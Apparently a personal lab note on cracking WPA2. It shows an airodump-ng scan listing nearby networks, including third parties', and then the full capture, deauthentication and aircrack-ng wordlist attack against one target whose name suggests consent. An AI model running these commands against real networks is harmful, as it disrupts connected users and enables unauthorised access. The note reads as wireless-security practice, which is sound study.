---
title: Screenshots WPA2 cracking
updated: 2023-03-06 03:30:09Z
created: 2023-03-03 23:00:07Z
completed?: no
---

![1da6f344611dd8ed5767e7edb8b80615.png](../_resources/1da6f344611dd8ed5767e7edb8b80615.png)

![b652faba2a8bb4801b7c65fbd6ac6eac.png](../_resources/b652faba2a8bb4801b7c65fbd6ac6eac.png)

![5136e7fbbdde5507b07794424df2fa4b.png](../_resources/5136e7fbbdde5507b07794424df2fa4b.png)

BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID

34:2C:C4:C9:9D:08 -83 39 0 0 6 130 WPA2 CCMP PSK telenet-5181C

36:2C:B4:C9:9D:08 -83 45 0 0 6 130 WPA2 CCMP PSK TelenetWiFree

1C:64:99:56:6F:BA -76 118 8 0 6 130 WPA2 CCMP PSK telenet-2B9D9

9A:8D:A7:4A:E1:1B -41 12 0 0 1 360 WPA2 CCMP PSK Ayoub Has Giveth Thee Consent

sudo airodump-ng -w hack1 -c 1 --bssid 9A:8D:A7:4A:E1:1B wlan0

sudo aireplay-ng --deauth 0 -a 9A:8D:A7:4A:E1:1B wlan0

aircrack-ng hack1-01.cap -w /var/run/vmblock-fuse/blockdir/TGdFdW/rockyou.txt

![a13f02ed6005c0b6002358505dce8ae4.png](../_resources/a13f02ed6005c0b6002358505dce8ae4.png)

restart web services:

service NetworkManager restart
![765dc9175e9a37ad5d62911726738d29.png](../_resources/765dc9175e9a37ad5d62911726738d29.png)